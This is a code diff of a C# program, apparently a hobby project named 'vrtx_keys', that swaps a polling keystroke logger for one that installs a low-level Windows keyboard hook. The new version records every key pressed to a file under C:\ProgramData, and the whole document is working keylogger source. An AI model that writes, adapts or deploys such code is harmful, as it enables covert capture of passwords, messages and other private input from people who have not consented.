@@ -1,107 +1,111 @@
 ﻿using System;
-using System.Collections.Generic;
-using System.IO;
-using System.Linq;
 using System.Runtime.InteropServices;
-using System.Text;
-using System.Threading;
-using System.Threading.Tasks;
+using System.Diagnostics;
+using System.Windows.Forms;
+using System.IO;
 
 namespace vrtx_keys {
     class KeyBoardListener {
-        //importando a dll responsável por identificar se "n" tecla está sendo pressionada ou não
-        [DllImport("user32.dll")]
-        public static extern short GetAsyncKeyState(int vKey);
+        private static int WH_KEYBOARD_LL = 13;
+        private static int WM_KEYDOWN = 0x0100;
+        private static int WM_KEYUP = 0x0101;
+        private static int HC_ACTION = 0;
+        private static int VK_SHIFT = 0x10;
+        private static int VK_CAPITAL = 0x14;
 
-        [DllImport("user32.dll")]
-        public static extern bool GetKeyState(int vKey);
+        public static LowLevelKeyboardProc llkProcedure = HookCallback;
+        private static bool capsPressed = GetKeyState(VK_CAPITAL);
+        private static bool shiftPressed = GetKeyState(VK_SHIFT);
+        private static string FILEPATH = @"C:\ProgramData\mylog.txt";
 
+        public delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
 
-        //constante que indica que a tecla está pressioanada
-        const int PRESSED = -32767;
+        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
+            if(nCode >= HC_ACTION) {
+                int vkCode = Marshal.ReadInt32(lParam);
 
-        short i, keyState;  // contador, estado da tecla
-        string path = @""; //caminho da onde será guardada as informações
+                if(wParam == (IntPtr)WM_KEYDOWN) {
+                    if(vkCode == VK_CAPITAL)
+                        capsPressed = !capsPressed;
 
-        //funcao que sera responsavel por identificar qual tecla foi pressionada
-        public void Listener() {
-            string filepath = fileAccess(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments));
-
-            while(true) {
-                //pausa para que o programa tenha chance de rodar.
-                Thread.Sleep(5);
-
-                for(i = 8; i < 255; i++) {
-                    keyState = GetAsyncKeyState(i);
-
-                    if(keyState == PRESSED) {
-                        Console.WriteLine(i);
-                        writeChar(i, filepath);
-                    }
+                    writeChar(vkCode);
                 }
             }
+            return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);
         }
 
-        private string fileAccess(string path) {
-            if(!Directory.Exists(path)) {
-                Directory.CreateDirectory(path);
-            }
-
-            string filepath = path + @"\data.txt";
-
-            if(!File.Exists(filepath)) {
-                using(StreamWriter sw = File.CreateText(filepath)) { }
-            }
-
-            return filepath;
+        public static IntPtr SetHook(LowLevelKeyboardProc proc) {
+            Process currentProcess = Process.GetCurrentProcess();
+            ProcessModule currentModule = currentProcess.MainModule;
+            String moduleName = currentModule.ModuleName;
+            IntPtr moduleHandle = GetModuleHandle(moduleName);
+            return SetWindowsHookEx(WH_KEYBOARD_LL, llkProcedure, moduleHandle, 0);
         }
 
-        private void writeChar(int keyPressed, string filepath) {
-            using(StreamWriter sw = File.AppendText(filepath)) {
-                switch(keyPressed) {
-                    case 8: //Backspace
-                        sw.Write("{BKSP}");
-                        Console.Write("{BKSP}");
+        private static void writeChar(int vkCode) {
+            using(StreamWriter output = File.AppendText(FILEPATH)) {
+                switch(((Keys)vkCode).ToString()) {
+                    case "Capital":
+                    case "LShiftKey":
+                    case "RShiftKey":
                         break;
-                    case 9: //Tab
-                        sw.Write("{TAB}");
-                        Console.Write("{TAB}");
+
+                    case "Oemcomma":
+                        Console.Out.Write(",");
+                        output.Write(",");
                         break;
-                    case 10: //NL, new line = \n
-                        sw.Write("{N}");
-                        Console.Write("{N}");
+
+                    case "OemPeriod":
+                        Console.Out.Write(".");
+                        output.Write(".");
                         break;
-                    case 11: //Vertical tab = \v
-                        sw.Write("{V}");
-                        Console.Write("{V}");
+
+                    case "Return":
+                        Console.Out.Write("\n");
+                        output.Write("\n");
                         break;
-                    case 12: //New page = \f
-                        sw.Write("{F}");
-                        Console.Write("{F}");
+
+                    case "Space":
+                        Console.Out.Write(" ");
+                        output.Write(" ");
                         break;
-                    case 13: //Carriage return = Enter
-                        sw.Write("{ENTER}");
-                        Console.Write("{ENTER}");
-                        break;
-                    case 16:
-                        break;
-                    case 161:
-                        break;
-                    case 20:
+
+                    case "Tab":
+                        Console.Out.Write("    ");
+                        output.Write("    ");
                         break;
 
                     default:
-                        if(GetKeyState(0x14) ^ GetKeyState(0x10)) {
-                            sw.Write((char)keyPressed);
-                            Console.Write((char)keyPressed);
+                        shiftPressed = GetAsyncKeyState(VK_SHIFT) < 0;
+                        if(shiftPressed ^ capsPressed) {
+                            Console.Out.Write((Keys)vkCode);
+                            output.Write((Keys)vkCode);
                         }
                         else {
-                            sw.Write(((char)keyPressed).ToString().ToLower());
-                            Console.Write(((char)keyPressed).ToString().ToLower());
+                            Console.Out.Write(((Keys)vkCode).ToString().ToLower());
+                            output.Write(((Keys)vkCode).ToString().ToLower());
                         }
                     break;
                 }
             }
         }
+
+        [DllImport("user32.dll")]
+        private static extern bool GetKeyState(int vKey);
+
+        [DllImport("user32.dll")]
+        private static extern short GetAsyncKeyState(int vKey);
+
+        [DllImport("user32.dll")]
+        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
+
+        [DllImport("user32.dll")]
+        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
+
+        [DllImport("user32.dll")]
+        private static extern bool UnhookWindowsHookEx(IntPtr hhk);
+
+        [DllImport("kernel32.dll")]
+        private static extern IntPtr GetModuleHandle(String lpModuleName);
     }
 }
